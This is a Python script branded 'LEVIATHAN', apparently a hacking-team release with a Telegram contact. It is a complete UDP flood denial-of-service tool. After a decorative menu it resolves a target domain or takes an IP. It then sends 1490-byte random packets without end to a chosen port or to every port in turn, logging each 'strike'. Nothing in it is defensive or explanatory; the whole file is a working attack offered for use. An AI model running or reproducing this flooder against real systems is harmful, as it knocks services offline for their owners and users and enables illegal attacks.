import os
import sys
import time
import socket
import random
from platform import system

# --- ULTRA HIGHLIGHTED COLORS ---
W = '\033[1;37m'  # White Bold
G = '\033[1;32m'  # Green Bold
R = '\033[1;31m'  # Red Bold
Y = '\033[1;33m'  # Yellow Bold
B = '\033[1;34m'  # Blue Bold
C = '\033[1;36m'  # Cyan Bold
M = '\033[1;35m'  # Magenta Bold
RE = '\033[0m'    # Reset
# Background Highlights
HG = '\033[1;42;30m' # Highlight Green
HR = '\033[1;41;37m' # Highlight Red
HB = '\033[1;44;37m' # Highlight Blue
HC = '\033[1;46;30m' # Highlight Cyan

def clear():
    os.system('cls' if system() == "Windows" else 'clear')

def logo():
    clear()
    print(f"""
{C}   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
           {HG}  SYSTEM VERSION: 3.0  {RE}   {HB}  TEAM: LEVIATHAN  {RE}
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}
    """)

def slow_print(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

def startup():
    clear()
    print(f"\n\n{B}[>] {W}BOOTING LEVIATHAN CORE...")
    time.sleep(1)
    for i in range(1, 101, 5):
        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
        sys.stdout.flush()
        time.sleep(0.05)
    print(f"\n\n{HG}  SUCCESS: ALL MODULES LOADED  {RE}\n")
    time.sleep(1.5)

# Initialize Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

startup()

while True:
    logo()
    print(f" {HC}  MAIN INTERFACE  {RE} ")
    print(f"\n {G}[1]{W} ATTACK DOMAIN")
    print(f" {G}[2]{W} ATTACK TARGET IP")
    print(f" {G}[3]{W} VIEW CREDITS")
    print(f" {R}[0]{W} TERMINATE SYSTEM")
    
    print(f"\n{C}╔═══[{G}Leviathan@Console{C}]")
    choice = input(f"{C}╚══{B}> {Y}")

    if choice == '1':
        domain = input(f"\n{B}[?]{W} TARGET URL: {Y}")
        try:
            ip = socket.gethostbyname(domain)
            break
        except:
            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
            time.sleep(2)
    elif choice == '2':
        ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
        break
    elif choice == '3':
        print(f"\n{HB}  DEVELOPER INFO  {RE}")
        print(f"{W}Created by  : {G}LEVIATHAN")
        print(f"{W}Telegram    : {C}@leviathan_official")
        print(f"{W}Status      : {Y}STABLE RELEASE")
        input(f"\n{M}BACK TO MENU (ENTER)...")
    elif choice == '0' or choice == '00':
        print(f"{HR} SHUTTING DOWN... {RE}")
        sys.exit()
    else:
        print(f"{HR} INVALID SELECTION {RE}")
        time.sleep(1)

# Attack Setup
logo()
print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
print(f"\n{W}TARGET IP  : {R}{ip}")
port_choice = input(f"{W}SET CUSTOM PORT? (y/n): {Y}").lower()

if port_choice == "y":
    port = int(input(f"{B}[?]{W} ENTER PORT: {Y}"))
    port_mode = True
else:
    port = 1
    port_mode = False

# Warning Countdown
print(f"\n{HR}  WARNING: ATTACK STARTING IN 3 SECONDS  {RE}")
time.sleep(3)

sent = 0
try:
    while True:
        if not port_mode:
            port = port + 1 if port < 65534 else 1
        
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        
        # Highlighted Attack Log
        print(f"{G}LEVIATHAN_STRIKE {W}>> {R}{ip}{W} | {B}PORT:{Y}{port} {W}| {HG} SENT:{sent} {RE}")
        
        # Optional: very small sleep to prevent Termux crash on some devices
        # time.sleep(0.001) 

except KeyboardInterrupt:
    print(f"\n\n{HR}  ATTACK ABORTED BY USER  {RE}")
    print(f"{HC} TOTAL DATA PACKETS SENT: {sent} {RE}")
    time.sleep(3)
